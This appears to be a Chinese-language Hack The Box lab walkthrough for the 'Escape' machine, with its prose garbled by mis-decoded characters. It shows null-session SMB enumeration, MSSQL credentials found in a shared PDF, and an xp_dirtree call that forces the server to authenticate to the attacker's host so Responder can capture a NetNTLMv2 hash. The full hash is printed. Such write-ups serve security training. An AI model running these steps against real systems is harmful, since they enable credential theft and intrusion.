<h2 id="TLSè¯ä¹¦"><a href="#TLSè¯ä¹¦" class="headerlink" title="TLSè¯ä¹¦"></a>TLSè¯ä¹¦</h2><p>æ·±å…¥åœ°ç ”ç©¶ä½¿ç”¨ä¸­çš„TLSè¯ä¹¦ï¼Œä½¿ç”¨opensslå°†å…¶æ‹‰å‡ºå¹¶æ ¼å¼åŒ–:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text</span></span><br><span class="line">Can<span class="string">&#x27;t use SSL_get_servername</span></span><br><span class="line"><span class="string">depth=0 CN = dc.sequel.htb</span></span><br><span class="line"><span class="string">verify error:num=20:unable to get local issuer certificate</span></span><br><span class="line"><span class="string">verify return:1</span></span><br><span class="line"><span class="string">depth=0 CN = dc.sequel.htb</span></span><br><span class="line"><span class="string">verify error:num=21:unable to verify the first certificate</span></span><br><span class="line"><span class="string">verify return:1</span></span><br><span class="line"><span class="string">depth=0 CN = dc.sequel.htb</span></span><br><span class="line"><span class="string">verify return:1</span></span><br><span class="line"><span class="string">Certificate:</span></span><br><span class="line"><span class="string">    Data:</span></span><br><span class="line"><span class="string">        Version: 3 (0x2)</span></span><br><span class="line"><span class="string">        Serial Number:</span></span><br><span class="line"><span class="string">            1e:00:00:00:04:90:52:7b:fc:91:38:74:2f:00:00:00:00:00:04</span></span><br><span class="line"><span class="string">        Signature Algorithm: sha256WithRSAEncryption</span></span><br><span class="line"><span class="string">        Issuer: DC = htb, DC = sequel, CN = sequel-DC-CA</span></span><br><span class="line"><span class="string">        Validity</span></span><br><span class="line"><span class="string">            Not Before: Nov 18 21:20:35 2022 GMT</span></span><br><span class="line"><span class="string">            Not After : Nov 18 21:20:35 2023 GMT</span></span><br><span class="line"><span class="string">        Subject: CN = dc.sequel.htb</span></span><br><span class="line"><span class="string">        Subject Public Key Info:</span></span><br><span class="line"><span class="string">            Public Key Algorithm: rsaEncryption</span></span><br><span class="line"><span class="string">                Public-Key: (2048 bit)</span></span><br><span class="line"><span class="string">                Modulus:</span></span><br><span class="line"><span class="string">                    00:a6:92:78:aa:2e:fe:07:2f:e4:d9:88:f2:d4:9f:</span></span><br><span class="line"><span class="string">                    37:64:9d:73:fe:ca:4e:ef:85:bd:b5:46:70:3d:f8:</span></span><br><span class="line"><span class="string">                    2f:98:38:f4:28:17:f8:15:1d:c8:37:d1:ad:2e:08:</span></span><br><span class="line"><span class="string">                    d5:5f:a0:87:c1:3b:5e:cf:c9:1d:97:6b:5c:e7:c1:</span></span><br><span class="line"><span class="string">                    c1:f2:8f:41:e2:6c:9a:2a:3c:e1:2a:64:57:d7:47:</span></span><br><span class="line"><span class="string">                    98:69:27:b4:89:c4:f9:7d:95:28:2c:3c:42:53:3e:</span></span><br><span class="line"><span class="string">                    28:bb:f7:db:b4:cd:c0:52:d3:c4:5c:a0:68:92:e0:</span></span><br><span class="line"><span class="string">                    67:8b:ec:7c:c0:cd:97:a5:45:d1:ce:75:d6:3c:bd:</span></span><br><span class="line"><span class="string">                    f0:a9:01:6c:07:dd:69:32:e6:f5:67:3f:ca:99:ec:</span></span><br><span class="line"><span class="string">                    b7:11:98:31:4f:8d:cf:74:f6:38:09:92:70:0e:fa:</span></span><br><span class="line"><span class="string">                    48:51:e5:e0:db:dd:c7:1b:5a:ff:c8:ca:97:df:50:</span></span><br><span class="line"><span class="string">                    19:e1:e3:cb:78:d6:03:a5:8c:e8:7c:a8:38:0b:92:</span></span><br><span class="line"><span class="string">                    bf:da:66:8d:fb:04:d3:67:5b:7a:01:18:aa:01:60:</span></span><br><span class="line"><span class="string">                    50:af:11:51:4c:7e:af:4c:ea:13:e8:d1:7e:e8:7c:</span></span><br><span class="line"><span class="string">                    40:2d:71:71:c5:6c:3f:ec:ea:df:27:85:a5:e5:8e:</span></span><br><span class="line"><span class="string">                    6e:8b:51:f9:bd:64:b5:7a:b9:d5:3c:4f:7c:6a:22:</span></span><br><span class="line"><span class="string">                    63:7b:70:79:99:3b:0f:73:3c:3b:a0:a0:45:11:db:</span></span><br><span class="line"><span class="string">                    33:45</span></span><br><span class="line"><span class="string">                Exponent: 65537 (0x10001)</span></span><br><span class="line"><span class="string">        X509v3 extensions:</span></span><br><span class="line"><span class="string">            1.3.6.1.4.1.311.20.2:</span></span><br><span class="line"><span class="string">                . .D.o.m.a.i.n.C.o.n.t.r.o.l.l.e.r</span></span><br><span class="line"><span class="string">            X509v3 Extended Key Usage:</span></span><br><span class="line"><span class="string">                TLS Web Client Authentication, TLS Web Server Authentication</span></span><br><span class="line"><span class="string">            X509v3 Key Usage: critical</span></span><br><span class="line"><span class="string">                Digital Signature, Key Encipherment</span></span><br><span class="line"><span class="string">            S/MIME Capabilities:</span></span><br><span class="line"><span class="string">......0...`.H.e...*0...`.H.e...-0...`.H.e....0...`.H.e....0...+....0</span></span><br><span class="line"><span class="string">..*.H..</span></span><br><span class="line"><span class="string">            X509v3 Subject Key Identifier:</span></span><br><span class="line"><span class="string">                22:E2:60:5F:A1:1E:F7:90:9E:56:2A:7B:95:BB:4C:0E:DE:6C:58:87</span></span><br><span class="line"><span class="string">            X509v3 Authority Key Identifier:</span></span><br><span class="line"><span class="string">                62:9F:32:A3:A0:F0:38:20:D4:60:C0:CD:6D:C5:FA:51:30:5E:C3:15</span></span><br><span class="line"><span class="string">            X509v3 CRL Distribution Points:</span></span><br><span class="line"><span class="string">                Full Name:</span></span><br><span class="line"><span class="string">                  URI:ldap:///CN=sequel-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint</span></span><br><span class="line"><span class="string">            Authority Information Access:</span></span><br><span class="line"><span class="string">                CA Issuers - URI:ldap:///CN=sequel-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?cACertificate?base?objectClass=certificationAuthority</span></span><br><span class="line"><span class="string">            X509v3 Subject Alternative Name:</span></span><br><span class="line"><span class="string">                othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span></span><br><span class="line"><span class="string">    Signature Algorithm: sha256WithRSAEncryption</span></span><br><span class="line"><span class="string">    Signature Value:</span></span><br><span class="line"><span class="string">        92:e4:4b:28:07:bc:2f:a3:51:de:8c:0f:4e:e7:ea:f3:7e:fd:</span></span><br><span class="line"><span class="string">        56:c4:6e:88:fe:fb:6a:9a:51:98:eb:5d:c6:49:7f:6e:2d:f3:</span></span><br><span class="line"><span class="string">        91:13:8b:11:26:c0:ff:b1:8e:cb:ee:c3:c8:af:c5:5f:8e:ac:</span></span><br><span class="line"><span class="string">        f1:19:b2:2a:49:ed:cc:0f:8f:17:9d:45:cc:23:a5:e5:f2:ab:</span></span><br><span class="line"><span class="string">        bf:85:b3:36:51:f5:0f:d0:c2:03:06:87:0a:56:08:b5:60:fd:</span></span><br><span class="line"><span class="string">        ee:c8:f4:78:84:39:1b:bf:69:c1:f9:00:83:ac:5e:9d:28:4c:</span></span><br><span class="line"><span class="string">        1e:cd:f6:b3:02:7e:b0:88:b3:72:80:53:df:74:a7:25:7e:26:</span></span><br><span class="line"><span class="string">        1c:df:b1:e5:63:26:28:97:98:a7:a2:be:fb:cb:26:e9:27:c1:</span></span><br><span class="line"><span class="string">        89:ae:95:a9:e5:78:e6:52:5a:59:63:72:45:d6:cf:6f:6b:9c:</span></span><br><span class="line"><span class="string">        a4:1f:38:33:35:08:93:7b:b1:6a:0d:18:df:87:de:15:65:43:</span></span><br><span class="line"><span class="string">        32:62:84:cf:2a:9b:d3:4e:d4:f2:e2:9e:95:24:3c:0a:b9:26:</span></span><br><span class="line"><span class="string">        8b:ec:3a:fa:fb:e5:93:af:22:04:9b:11:ad:21:63:bb:48:a1:</span></span><br><span class="line"><span class="string">        07:68:13:06:d9:31:23:02:40:37:4e:4a:5a:48:e9:f8:c9:81:</span></span><br><span class="line"><span class="string">        ed:74:bc:26:69:fd:85:20:48:bf:1b:82:dc:ed:b4:21:98:37:</span></span><br><span class="line"><span class="string">        dd:8b:2a:b4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">read:errno=104</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„é¢å‘è¯ä¹¦çš„è¯ä¹¦é¢å‘æœºæ„sequel-DC-CAã€‚</p>
<h2 id="SMB-TCP-445"><a href="#SMB-TCP-445" class="headerlink" title="SMB - TCP 445"></a>SMB - TCP 445</h2><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>ä½¿ç”¨crackmapexecè®¿é—®SMB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># crackmapexec smb 10.10.11.202 --shares</span></span><br><span class="line">SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.202    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä»»ä½•ç”¨æˆ·åå’Œç©ºå¯†ç :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># crackmapexec smb 10.10.11.202 -u fdnotreallyausername -p &#x27;&#x27; --shares</span></span><br><span class="line">SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.202    445    DC               [+] sequel.htb\fdnotreallyausername:</span><br><span class="line">SMB         10.10.11.202    445    DC               [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.202    445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.202    445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.202    445    DC               C$                              Default share</span><br><span class="line">SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share</span><br><span class="line">SMB         10.10.11.202    445    DC               Public          READ</span><br><span class="line">SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share</span><br></pre></td></tr></table></figure>

<h3 id="Public"><a href="#Public" class="headerlink" title="Public"></a>Public</h3><p>èƒ½è®¿é—®çš„å”¯ä¸€å…±äº«æ˜¯Publicã€‚ä½¿ç”¨-Nä¸ºç©ºå¯†ç ï¼Œå°†pdfæ–‡ä»¶ä¸‹è½½ä¸‹æ¥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># smbclient //10.10.11.202/Public -N</span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">  ..                                  D        0  Sat Nov 19 06:51:25 2022</span><br><span class="line">  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022</span><br><span class="line"></span><br><span class="line">                5184255 blocks of size 4096. 1470835 blocks available</span><br><span class="line">smb: \&gt; get <span class="string">&quot;SQL Server Procedures.pdf&quot;</span></span><br><span class="line">getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Server-Procedures-pdf"><a href="#SQL-Server-Procedures-pdf" class="headerlink" title="SQL Server Procedures.pdf"></a>SQL Server Procedures.pdf</h3><p>è¿™ä¸ªæ–‡æ¡£åªæœ‰ä¸€é¡µå¤šä¸€ç‚¹ï¼Œé‡Œé¢æœ‰è¿æ¥åˆ°MSSQLçš„ä¿¡æ¯:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user PublicUser and password GuestUserCantWrite1</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape1.png"></li>
</ul>
<p>è¯¥ç”¨æˆ·å&#x2F;å¯†ç æ— æ³•é€šè¿‡WinRMè¿›è¡Œè¿æ¥ã€‚</p>
<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>é€šè¿‡è¿™äº›credsï¼Œå¯ä»¥è¿æ¥åˆ°MSSQLæœåŠ¡å™¨ã€‚ä½¿ç”¨Impacketå·¥å…·mssqlclient.py, è¯¥æœåŠ¡å™¨ä¸Šæœ‰å››ä¸ªæ•°æ®åº“</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; select name from master..sysdatabases;</span><br><span class="line">name</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">master</span><br><span class="line"></span><br><span class="line">tempdb</span><br><span class="line"></span><br><span class="line">model</span><br><span class="line"></span><br><span class="line">msdb</span><br><span class="line"></span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure>

<h2 id="é¢å¤–æšä¸¾"><a href="#é¢å¤–æšä¸¾" class="headerlink" title="é¢å¤–æšä¸¾"></a>é¢å¤–æšä¸¾</h2><p>ç°åœ¨è¿˜å¯ä»¥åšæ›´å¤šæšä¸¾:</p>
<ul>
<li>æ£€æŸ¥DNSæ˜¯å¦å­˜åœ¨åŒºåŸŸä¼ è¾“&#x2F;æš´åŠ›ç ´è§£å­åŸŸã€‚</li>
<li>æšä¸¾LDAPï¼ŒåŒ…å«å’Œä¸åŒ…å«å¯†ç ã€‚</li>
<li>ç”¨å¯†ç æ¥è¿è¡ŒBloodhoundã€‚</li>
<li>ä½¿ç”¨å¯†ç è¿›è¡ŒKerberoastã€‚</li>
<li>é€šè¿‡Kerberoså¼ºåˆ¶ä½¿ç”¨ç”¨æˆ·å&#x2F;å¯†ç ã€‚</li>
</ul>
<p>ç›®å‰ä¸ºæ­¢æç¤º(åŸŸåã€æ–‡æ¡£è®¨è®ºçš„æ˜¯MSSQLçš„äº‹å®)ï¼Œæ²¿ç€è¿™ä¸ªæ–¹å‘ï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œè¿˜ä¼šå†æ¬¡æšä¸¾ã€‚</p>
<h1 id="Shell-as-sql-svc"><a href="#Shell-as-sql-svc" class="headerlink" title="Shell as sql_svc"></a>Shell as sql_svc</h1><h2 id="è¿è¡Œå‘½ä»¤å¤±è´¥"><a href="#è¿è¡Œå‘½ä»¤å¤±è´¥" class="headerlink" title="è¿è¡Œå‘½ä»¤å¤±è´¥"></a>è¿è¡Œå‘½ä»¤å¤±è´¥</h2><p>å°è¯•çš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä½¿ç”¨xp_cmdshellå­˜å‚¨è¿‡ç¨‹é€šè¿‡MSSQLæœåŠ¡å™¨è¿è¡Œå‘½ä»¤ã€‚ä½†æ˜¯å¤±è´¥äº†:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span></span><br><span class="line">[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object <span class="string">&#x27;xp_cmdshell&#x27;</span>, database <span class="string">&#x27;mssqlsystemresource&#x27;</span>, schema <span class="string">&#x27;sys&#x27;</span>.</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¯ç”¨å®ƒ(æ­£å¦‚åœ¨<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIyLzEwLzAxL2h0Yi1zY3JhbWJsZWQtYmV5b25kLXJvb3QuaHRtbCNnZXQtZXhlY3V0aW9uLXZpYS1tc3NxbA==">scrambleçš„Alternative Roots<i class="fa fa-external-link-alt"></i></span>ä¸­æ‰€ç¤º)ï¼Œä½†è¿™ä¸ªå¸æˆ·æ²¡æœ‰æƒé™:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; EXECUTE sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1</span><br><span class="line">[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.</span><br></pre></td></tr></table></figure>

<h2 id="è·å–Net-NTLMv2"><a href="#è·å–Net-NTLMv2" class="headerlink" title="è·å–Net-NTLMv2"></a>è·å–Net-NTLMv2</h2><p>æ•°æ®åº“ä¸­æ²¡æœ‰æœ‰ç”¨çš„æ•°æ®ï¼Œä¸èƒ½è¿è¡Œå‘½ä»¤ã€‚æ¥ä¸‹æ¥è¦å°è¯•çš„æ˜¯è®©SQLæœåŠ¡å™¨è¿æ¥å›æˆ‘çš„ä¸»æœºå¹¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶æ•è·å¯ä»¥å°è¯•æš´åŠ›ç ´è§£çš„challenge&#x2F;responseã€‚åœ¨<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE5LzA2LzIyL2h0Yi1xdWVyaWVyLmh0bWwjZGF0YWJhc2UtcHJpdmVzYy1yZXBvcnRlci0tbXNzcWwtc3Zj">Querier<i class="fa fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE5LzAxLzEzL2dldHRpbmctbmV0LW50bG0taGFzZXMtZnJvbS13aW5kb3dzLmh0bWwjZGF0YWJhc2UtYWNjZXNz">Getting Creds via NTLMv2<i class="fa fa-external-link-alt"></i></span>ä¸­éƒ½å±•ç¤ºäº†è¿™ä¸€ç‚¹ã€‚</p>
<p>åœ¨è¿™é‡Œå¯åŠ¨<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xnYW5keC9SZXNwb25kZXI=">Responder<i class="fa fa-external-link-alt"></i></span>ä½œä¸ºrootç›‘å¬tun0æ¥å£çš„ä¸€å †æœåŠ¡</p>
<p>å”¯ä¸€å…³å¿ƒçš„æ˜¯SMBã€‚ç°åœ¨å‘Šè¯‰MSSQLè¯»å–ä¸»æœºä¸Šå…±äº«çš„æ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; EXEC xp_dirtree <span class="string">&#x27;\\10.10.16.2\share&#x27;</span>, 1, 1</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿”å›ä»»ä½•ä¸œè¥¿ï¼Œä½†åœ¨Responderæœ‰ä¸€ä¸ªâ€hashâ€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># responder -I tun0</span></span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Patreon -&gt; https://www.patreon.com/PythonResponder</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.2]</span><br><span class="line">    Responder IPv6             [dead:beef:4::1000]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-H6VOL0QMDH2]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [ZXWC.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [49831]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Error starting TCP server on port 53, check permissions or other servers running.</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Client   : 10.10.11.202</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Username : sequel\sql_svc</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a052ed0636102870:E34517E6D5F61D5423F401D9A35B8AE0:010100000000000000FA92A342A2D901C3A576838D8EBA6E00000000020008005A0058005700430001001E00570049004E002D004800360056004F004C00300051004D0044004800320004003400570049004E002D004800360056004F004C00300051004D004400480032002E005A005800570043002E004C004F00430041004C00030014005A005800570043002E004C004F00430041004C00050014005A005800570043002E004C004F00430041004C000700080000FA92A342A2D9010600040002000000080030003000000000000000000000000030000012E38F1D56C0404175A7C4C531D6164BC569F5ABDD833B040000C1B5F25101B90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000</span></span><br></pre></td></tr></table></figure>

